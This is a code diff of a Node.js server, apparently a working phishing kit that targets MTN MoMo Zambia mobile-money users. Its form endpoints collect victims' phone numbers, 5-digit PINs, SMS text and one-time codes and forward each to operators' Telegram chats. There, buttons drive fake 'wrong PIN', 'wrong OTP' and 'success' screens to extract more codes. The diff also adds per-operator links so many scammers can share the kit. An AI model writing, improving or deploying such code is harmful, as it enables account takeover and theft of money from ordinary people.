@@ -1,200 +1,486 @@
+/**
+ * **MTN MOMO ZAMBIA - SECURE MULTI-ADMIN SERVER**
+ */
+
 const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
-const fetch = require('node-fetch');
+const fs = require('fs');
 
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const applications = {};
+const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
+const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+if (!TOKEN) {
+  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
+  process.exit(1);
+}
 
-app.post('/api/applications', (req, res) => {
-  const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
-  applications[appId] = {
-    id: appId,
-    ...req.body,
-    status: 'pending_auth'
-  };
-  res.json({ id: appId });
-});
+if (!APP_URL) {
+  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
+  process.exit(1);
+}
 
-app.post('/verify-pin', async (req, res) => {
-  const { appId, pin, phone } = req.body;
-  if (!applications[appId]) {
-    applications[appId] = { id: appId };
-  }
-  applications[appId].momo_phone = phone;
-  applications[appId].momo_pin = pin;
-  applications[appId].status = 'pending_auth';
+const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
-  const message = `🔐 *NEW APPLICATION ZAMBIA*\n\n` +
-    `📱 *Phone:* +260 ${phone}\n` +
-    `🔑 *PIN:* \`${pin}\`\n` +
-    `🆔 *App ID:* ${appId}`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ ALLOW TO PROCEED', callback_data: `auth_approve_${appId}` }
-      ]
-    ]
-  };
-
+function loadAdmins() {
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/verify-sms', async (req, res) => {
-  const { appId, smsText } = req.body;
-  if (applications[appId]) {
-    applications[appId].sms_text = smsText;
-    applications[appId].status = 'pending_sms';
-  }
-
-  const message = `💬 *SMS VERIFICATION TEXT RECEIVED*\n\n` +
-    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
-    `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
-    `🆔 *App ID:* ${appId}`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ CORRECT SMS TEXT', callback_data: `sms_approve_${appId}` },
-        { text: '❌ WRONG SMS TEXT', callback_data: `sms_reject_${appId}` }
-      ]
-    ]
-  };
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/verify-otp', async (req, res) => {
-  const { appId, otpCode } = req.body;
-  if (applications[appId]) {
-    applications[appId].otp_code = otpCode;
-    applications[appId].status = 'pending_otp';
-  }
-
-  const message = `🔢 *OTP VERIFICATION RECEIVED*\n\n` +
-    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n` +
-    `🔑 *OTP Code:* \`${otpCode}\`\n` +
-    `🆔 *App ID:* ${appId}`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ CORRECT OTP', callback_data: `otp_approve_${appId}` },
-        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` },
-        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
-      ]
-    ]
-  };
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/api/request-sms', async (req, res) => {
-  const { appId, phone } = req.body;
-
-  const message = `🔄 *NEW SMS REQUEST*\n\n` +
-                  `📱 *Phone:* +260 ${phone || 'N/A'}\n` +
-                  `🆔 *App ID:* ${appId}\n\n` +
-                  `The applicant has requested a new SMS verification timer reset.`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    console.error('Telegram notification error:', err);
-    res.status(500).json({ error: 'Failed to send notification' });
-  }
-});
-
-app.get('/check-status/:id', (req, res) => {
-  const appData = applications[req.params.id];
-  if (!appData) return res.status(404).json({ error: 'Not found' });
-  res.json(appData);
-});
-
-app.post('/telegram-webhook', async (req, res) => {
-  const update = req.body;
-  if (update.callback_query) {
-    const cb = update.callback_query;
-    const parts = cb.data.split('_');
-    const type = parts[0];     // auth, sms, or otp
-    const action = parts[1];   // approve or reject
-    const appId = parts.slice(2).join('_');
-
-    if (applications[appId]) {
-      if (type === 'auth' && action === 'reject') {
-        applications[appId].status = 'PIN_REJECTED';
-      } else if (type === 'auth') {
-        applications[appId].status = (action === 'approve') ? 'SMS_STEP' : 'PIN_REJECTED';
-      } else if (type === 'sms') {
-        applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
-      } else if (type === 'otp') {
-        if (action === 'approve') {
-          applications[appId].status = 'APPROVED';
-        } else {
-          applications[appId].status = 'OTP_REJECTED';
-        }
-      }
+    if (fs.existsSync(ADMINS_FILE)) {
+      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
+      const entries = JSON.parse(data);
+      return new Map(entries.map(([id, rec]) => [id, {
+        authorized: true,
+        paid: true,
+        username: rec.username || '',
+        firstName: rec.firstName || 'User',
+        lastName: rec.lastName || '',
+        status: rec.status || 'ACTIVE'
+      }]));
     }
+  } catch (err) {
+    console.error('[Storage] Error loading admins file:', err);
+  }
+  return new Map();
+}
 
+function saveAdmins() {
+  try {
+    const serialized = JSON.stringify(Array.from(admins.entries()));
+    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
+  } catch (err) {
+    console.error('[Storage] Error saving admins file:', err);
+  }
+}
+
+let bot = null;
+const sessions = new Map();
+const admins = loadAdmins();
+const adminConfigMessageIds = new Map();
+
+function resolveTargetChat(adminParam) {
+  if (adminParam && String(adminParam).trim() !== '') {
+    const targetAdmin = String(adminParam).trim();
+    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
+      return FALLBACK_ADMIN_ID;
+    }
+    return targetAdmin;
+  }
+  return FALLBACK_ADMIN_ID || null;
+}
+
+async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
+  const PAGE_SIZE = 5;
+  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
+  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
+  
+  if (page < 0) page = 0;
+  if (page >= totalPages) page = totalPages - 1;
+
+  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
+
+  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nAll sub-admins currently have free access:`;
+  let keyboard = [];
+
+  if (adminEntries.length === 0) {
+    adminListText += `\n\nNo sub-admins have started the bot yet.`;
+  } else {
+    paginatedEntries.forEach(([id, record]) => {
+      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: 🟢 Free Access Active`;
+    });
+  }
+
+  let navRow = [];
+  if (page > 0) navRow.push({ text: `⬅️ Prev`, callback_data: `PAGE_${page - 1}` });
+  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
+  if (page < totalPages - 1) navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
+  if (navRow.length > 0) keyboard.push(navRow);
+
+  if (messageId) {
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: cb.id, text: `Processed: ${action.toUpperCase()}` })
+      await bot.editMessageText(adminListText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: keyboard }
       });
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } })
-      });
-    } catch (e) {
-      console.error(e);
-    }
+      return;
+    } catch (err) {}
   }
-  res.sendStatus(200);
+
+  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
+    parse_mode: 'Markdown',
+    reply_markup: { inline_keyboard: keyboard } 
+  });
+  adminConfigMessageIds.set(chatId, sentMsg.message_id);
+}
+
+async function initBot() {
+  bot = new TelegramBot(TOKEN, { polling: false });
+  
+  const webhookPath = `/bot${TOKEN}`;
+  const webhookUrl = `${APP_URL}${webhookPath}`;
+
+  try {
+    await bot.setWebHook(webhookUrl);
+    app.post(webhookPath, (req, res) => {
+      res.sendStatus(200);
+      try { bot.processUpdate(req.body); } catch (err) {}
+    });
+  } catch (err) {
+    process.exit(1);
+  }
+
+  bot.onText(/\/admins/, async (msg) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) {
+      await bot.sendMessage(chatId, `⚠️ Unauthorized.`);
+      return;
+    }
+    await updateContinuousAdminList(chatId, null, 0);
+  });
+
+  bot.onText(/\/myprofile|\/me/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      const userId = msg.from.id;
+      const username = msg.from.username ? `@${msg.from.username}` : 'None';
+      const firstName = msg.from.first_name || 'N/A';
+      const lastName = msg.from.last_name || 'N/A';
+      
+      const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
+
+      let profileText = 
+        `👤 *Your Personal Details & Account Info*\n\n` +
+        `• *First Name:* ${firstName}\n` +
+        `• *Last Name:* ${lastName}\n` +
+        `• *Username:* ${username}\n` +
+        `• *Telegram ID:* \`${userId}\`\n` +
+        `• *Link Status:* 🟢 Free & Active\n\n` +
+        `🔗 *Your Exclusive Link:*\n${userLink}`;
+
+      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
+    } catch (err) {}
+  });
+
+  bot.onText(/\/start/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      const userId = msg.from.id;
+      const username = msg.from.username || '';
+      const firstName = msg.from.first_name || 'User';
+      const lastName = msg.from.last_name || '';
+
+      if (chatId === String(FALLBACK_ADMIN_ID)) {
+        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}\n\nType /admins to view sub-admins.`, {
+          parse_mode: 'Markdown',
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '📋 View Sub-Admins', callback_data: 'PAGE_0' }],
+              [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
+            ]
+          }
+        });
+        return;
+      }
+
+      if (!admins.has(chatId)) {
+        admins.set(chatId, {
+          authorized: true,
+          paid: true,
+          username,
+          firstName,
+          lastName,
+          startedAt: new Date()
+        });
+        saveAdmins();
+      } else {
+        const existing = admins.get(chatId);
+        existing.username = username;
+        existing.firstName = firstName;
+        existing.lastName = lastName;
+        saveAdmins();
+      }
+
+      await bot.sendMessage(FALLBACK_ADMIN_ID, 
+        `🚨 *New Sub-Admin Started Bot!*\n\n` +
+        `👤 *User:* ${username ? '@' + username : firstName} (${firstName} ${lastName})\n` +
+        `🆔 *Chat ID:* \`${userId}\`\n\n` +
+        `Status: Free link access granted automatically.`, 
+        { parse_mode: 'Markdown' }
+      );
+
+      const userLink = `${APP_URL}/?admin=${chatId}`;
+      let responseText = `👋 *Welcome ${firstName}!*\n\nYour account is active. Here is your free link:\n${userLink}`;
+
+      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
+
+    } catch (err) {}
+  });
+
+  bot.on('callback_query', async (query) => {
+    try {
+      const actionData = query.data || '';
+      const chatId = String(query.message.chat.id);
+      const user = query.from;
+
+      if (actionData === 'SHOW_MY_PROFILE') {
+        const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
+        let profileText = 
+          `👤 *Your Personal Details & Account Info*\n\n` +
+          `• *First Name:* ${user.first_name || 'N/A'}\n` +
+          `• *Last Name:* ${user.last_name || 'N/A'}\n` +
+          `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
+          `• *Telegram ID:* \`${user.id}\`\n` +
+          `• *Link Status:* 🟢 Free & Active\n\n` +
+          `🔗 *Your Exclusive Link:*\n${userLink}`;
+
+        await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(query.id);
+        return;
+      }
+
+      if (actionData.startsWith('PAGE_')) {
+        const pageNum = parseInt(actionData.split('_')[1]) || 0;
+        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
+        await bot.answerCallbackQuery(query.id);
+        return;
+      }
+
+      const parts = actionData.split('_');
+      const prefix = parts.slice(0, 2).join('_'); 
+      const targetId = parts.slice(2).join('_');
+
+      let session = sessions.get(targetId);
+      if (!session) {
+        session = { contact: 'Unknown', adminChatId: chatId };
+      }
+
+      const chatTarget = session.adminChatId || chatId;
+
+      switch (prefix) {
+        case 'ALLOW_OTP':
+          session.status = 'APPROVED_LOAD_OTP';
+          await bot.sendMessage(chatTarget, `✅ OTP Screen loaded for ${session.contact}`);
+          break;
+        case 'DENY_OTP':
+          session.status = 'DENIED';
+          await bot.sendMessage(chatTarget, `❌ Access Denied for ${session.contact}`);
+          break;
+        case 'CORRECT_OTP':
+          session.status = 'SUCCESS';
+          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for ${session.contact}`);
+          break;
+        case 'WRONG_PIN':
+          session.status = 'RETRY_PIN';
+          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error.`);
+          break;
+        case 'WRONG_OTP':
+          session.status = 'RETRY_OTP';
+          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error.`);
+          break;
+        case 'PASTED_APPROVE':
+          session.status = 'OTP_STEP';
+          await bot.sendMessage(chatTarget, `✅ Pasted SMS approved for ${session.contact}`);
+          break;
+        case 'PASTED_REJECT':
+          session.status = 'SMS_REJECTED';
+          await bot.sendMessage(chatTarget, `❌ Pasted SMS rejected for ${session.contact}`);
+          break;
+        default:
+          break;
+      }
+
+      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});
+
+      if (query.message && query.message.message_id) {
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        ).catch(() => {});
+      }
+    } catch (err) {
+      try {
+        await bot.answerCallbackQuery(query.id, { text: '⚠️ Error processing action.' }).catch(() => {});
+      } catch (e) {}
+    }
+  });
+}
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.post('/api/submit-application', async (req, res) => {
+  try {
+    let { contact, pin, amount, adminChatId } = req.body || {};
+
+    if (!adminChatId && req.query && req.query.admin) {
+      adminChatId = req.query.admin;
+    }
+
+    const cleanContact = String(contact || '').replace(/\D/g, '');
+    
+    // Validation: MTN Zambia numbers must start with 096 or 076 and be 10 digits total (e.g., 096xxxxxxx / 076xxxxxxx)
+    const mtnZambiaRegex = /^0(96|76)\d{7}$/;
+    if (!mtnZambiaRegex.test(cleanContact)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Invalid number. Applicants must use a valid MTN Zambia MoMo number only (e.g., 096... or 076...).' 
+      });
+    }
+
+    // Validation: MTN MoMo Zambia PIN must be exactly 5 digits
+    const cleanPin = String(pin || '').trim();
+    if (!/^\d{5}$/.test(cleanPin)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'MTN MoMo PIN must be exactly 5 digits.' 
+      });
+    }
+
+    const targetChat = resolveTargetChat(adminChatId);
+    if (!targetChat) {
+      return res.status(400).json({ success: false, error: 'Destination chat ID missing.' });
+    }
+
+    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
+
+    sessions.set(userId, {
+      contact: cleanContact,
+      pin: cleanPin,
+      amount: amount || 'ZMW 5,000',
+      adminChatId: targetChat,
+      status: 'WAITING_PIN_APPROVAL',
+      createdAt: new Date()
+    });
+
+    const message =
+      `🚨 *MTN MOMO ZAMBIA - PIN ATTEMPT*\n\n` +
+      `📱 *MTN Phone:* +260${cleanContact}\n` +
+      `🔑 *5-Digit PIN:* \`${cleanPin}\`\n` +
+      `💰 *Selected Amount:* ${amount}\n\n` +
+      `📌 *Status:* Waiting for Admin Approval`;
+
+    const opts = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
+            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    if (!bot) {
+      return res.status(500).json({ success: false, error: 'Bot instance not initialized' });
+    }
+
+    const sentMsg = await bot.sendMessage(targetChat, message, opts);
+    const session = sessions.get(userId);
+    if (session) session.adminMsgId = sentMsg.message_id;
+    
+    return res.status(200).json({ success: true, userId });
+
+  } catch (err) {
+    return res.status(500).json({ success: false, error: 'Telegram delivery failed: ' + (err?.message || 'Unknown error') });
+  }
+});
+
+app.post('/verify-sms-pasted', async (req, res) => {
+  try {
+    const { userId, pastedSms } = req.body || {};
+    const session = sessions.get(userId);
+
+    if (!session) {
+      return res.status(404).json({ success: false, error: 'Session not found' });
+    }
+
+    session.pasted_sms = pastedSms;
+    session.status = 'PENDING_PASTED_SMS';
+
+    const message =
+      `💬 *MTN ZAMBIA - PASTED SMS SUBMITTED*\n\n` +
+      `📱 *MTN Phone:* +260${session.contact}\n\n` +
+      `📄 *Content:*\n\`\`\`\n${pastedSms || 'N/A'}\n\`\`\`\n\n` +
+      `🆔 *User ID:* ${userId}`;
+
+    const opts = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ APPROVE SMS', callback_data: `PASTED_APPROVE_${userId}` },
+            { text: '❌ REJECT SMS', callback_data: `PASTED_REJECT_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    const targetChat = session.adminChatId;
+    if (targetChat && bot) {
+      await bot.sendMessage(targetChat, message, opts);
+    }
+
+    return res.status(200).json({ success: true });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
+  }
+});
+
+app.get('/api/check-status/:userId', (req, res) => {
+  const { userId } = req.params;
+  const session = sessions.get(userId);
+  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
+  res.status(200).json({ status: session.status });
+});
+
+app.post('/api/submit-otp', async (req, res) => {
+  try {
+    const { userId, otp } = req.body || {};
+    const session = sessions.get(userId);
+
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    session.status = 'WAITING_OTP_VERIFICATION';
+    session.otp = otp;
+
+    const message =
+      `📩 *OTP SUBMITTED BY USER*\n\n` +
+      `📱 *MTN Phone:* +260${session.contact}\n` +
+      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
+      `Select confirmation action:`;
+
+    const opts = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
+            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
+          ],
+          [
+            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    const targetChat = session.adminChatId;
+    if (targetChat && bot) {
+      await bot.sendMessage(targetChat, message, opts);
+    }
+
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
+  }
+});
+
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, async () => {
+  await initBot();
+});
